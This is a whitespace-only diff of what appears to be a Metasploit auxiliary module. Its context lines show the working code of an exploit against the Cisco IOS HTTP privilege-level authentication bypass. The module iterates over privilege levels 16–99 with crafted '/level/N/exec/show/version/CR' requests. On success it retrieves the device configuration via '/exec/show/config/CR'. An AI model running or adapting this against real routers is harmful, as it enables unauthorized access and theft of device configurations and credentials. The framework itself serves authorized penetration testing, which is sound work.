@@ -15,13 +15,13 @@ require 'msf/core'
 
 
 class Metasploit3 < Msf::Auxiliary
-	
+
 	# Exploit mixins should be called first
 	include Msf::Exploit::Remote::HttpClient
-	
+
 	# Include Cisco utility methods
 	include Msf::Auxiliary::Cisco
-	
+
 	# Scanner mixin should be near last
 	include Msf::Auxiliary::Scanner
 
@@ -49,13 +49,13 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def run_host(ip)
-	
+
 		16.upto(99) do |level|
 			res = send_request_cgi({
 				'uri'  		=>  "/level/#{level}/exec/show/version/CR",
 				'method'   	=> 'GET'
 			}, 20)
-			
+
 			if res and res.body and res.body =~ /Cisco Internetwork Operating System Software/
 				print_good("#{rhost}:#{rport} Found vulnerable privilege level: #{level}")
 
@@ -75,7 +75,7 @@ class Metasploit3 < Msf::Auxiliary
 					'uri'  		=>  "/level/#{level}/exec/show/config/CR",
 					'method'   	=> 'GET'
 				}, 20)
-				
+
 				if res and res.body and res.body =~ /<FORM METHOD([^\>]+)\>(.*)<\/FORM>/mi
 					config = $2.strip
 					print_good("#{rhost}:#{rport} Processing the configuration file...")
@@ -90,7 +90,7 @@ class Metasploit3 < Msf::Auxiliary
 				else
 					print_error("#{rhost}:#{rport} Error: could not retrieve the IOS configuration")
 				end
-				
+
 				break
 			end
 		end
